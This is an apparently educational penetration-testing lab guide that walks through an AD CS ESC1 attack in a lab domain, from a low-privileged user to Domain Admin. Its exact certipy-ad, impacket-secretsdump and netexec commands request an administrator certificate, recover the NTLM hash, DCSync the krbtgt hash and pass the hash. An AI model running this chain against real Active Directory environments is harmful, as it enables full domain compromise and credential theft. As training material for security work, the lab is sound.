# Lab 2: AD CS Abuse (ESC1) → Domain Admin

**Lab Description:** In this lab you will escalate from a single low-privileged domain user to
**full domain compromise** by abusing a misconfigured Active Directory Certificate Services
(AD CS) template (**ESC1**). You will discover the vulnerable template, request a certificate
that impersonates the built-in **Administrator**, authenticate with it to recover the
Administrator's NTLM hash, and use that hash to **DCSync** the domain's secrets.

**Estimated Duration:** **15 Minutes**

**Learning Objectives:** By the end of this lab, you will be able to:

- Enumerate AD CS for vulnerable certificate templates with **certipy**
- Abuse an **ESC1** template to request a certificate as another user
- Authenticate with a certificate (PKINIT) to recover an NTLM hash
- Perform a **DCSync** to dump domain credentials (incl. `krbtgt`)

**Environment / starting position:**

| Item | Value |
|---|---|
| Domain | `corp.local` (DC `dc1` @ 10.0.1.10) |
| Enterprise CA | `corp-CA` on `adcs.corp.local` (10.0.1.40) |
| Attacker host | `kali` |
| Starting credential (low-priv user) | `amiller` / `Summer2024` |

---

1. From the **Kali** host, enumerate AD CS for vulnerable certificate templates using
   **certipy-ad**.

    ```bash
    certipy-ad find -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 -vulnerable -stdout
    ```

    **Expected Output:** the `ESC1-VulnUser` template is reported as **ESC1** vulnerable — any
    domain user can enrol and supply an arbitrary subject (UPN).

    ```output
    Certificate Templates
      0
        Template Name      : ESC1-VulnUser
        Enrollment Rights  : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC1  : Enrollee supplies subject and template allows client authentication.
    ```

    > **Note (time skew):** certificate/Kerberos operations are time-sensitive. If a command
    > returns `KRB_AP_ERR_SKEW`, run `sudo systemctl restart systemd-timesyncd && sleep 5`
    > (or add `-ns 10.0.1.10` to the certipy command) and retry.

1. Abuse ESC1: request a certificate from the vulnerable template but set the subject UPN to
   **administrator@corp.local** — i.e. ask the CA for a cert that identifies you as the
   Domain Administrator.

    ```bash
    certipy-ad req -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 \
      -target adcs.corp.local -ca 'corp-CA' -template 'ESC1-VulnUser' \
      -upn 'administrator@corp.local'
    ```

    **Expected Output:** the CA issues the certificate and it is saved locally.

    ```output
    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Saving certificate and private key to 'administrator.pfx'
    ```

1. Authenticate to the DC with the issued certificate (PKINIT). certipy exchanges it for a
   Kerberos TGT and recovers the account's **NTLM hash**.

    ```bash
    certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.1.10
    ```

    **Expected Output:**

    ```output
    [*] Using principal: administrator@corp.local
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
    ```

    Copy the `<NTLM_HASH>` (the part after the colon) — that's the Domain Administrator's hash.

1. Use the Administrator hash to **DCSync** the domain — replicate secrets straight from the
   DC. Here we pull the `krbtgt` account (the key to forging Golden Tickets), proving full
   domain compromise.

    ```bash
    impacket-secretsdump 'corp.local/administrator@10.0.1.10' -hashes ':<NTLM_HASH>' -just-dc-user krbtgt
    ```

    **Expected Output:**

    ```output
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<krbtgt_hash>:::
    ```

1. (Optional) Confirm Domain Admin access interactively with the recovered hash
   (pass-the-hash):

    ```bash
    netexec smb 10.0.1.10 -u administrator -H <NTLM_HASH>
    ```

    **Expected Output:** the `(Pwn3d!)` flag indicates administrative access to the DC.

    ```output
    SMB   10.0.1.10   445   DC1   [+] corp.local\administrator:<hash> (Pwn3d!)
    ```

**Lab 2 Recap:** In this lab, you:

- Discovered the `ESC1-VulnUser` template as **ESC1** vulnerable with `certipy find`.
- Requested a certificate impersonating **Administrator** by abusing the enrollee-supplies-
  subject misconfiguration.
- Authenticated with the certificate to recover the Administrator NTLM hash.
- **DCSync'd** the domain and dumped the `krbtgt` hash — full domain compromise.

This proves the AD CS **ESC1** attack path is exploitable end-to-end and the environment can
be driven from a single low-privileged user to **Domain Admin**.

## You have successfully completed Lab 2.

You have validated two complete attack chains against the lab.
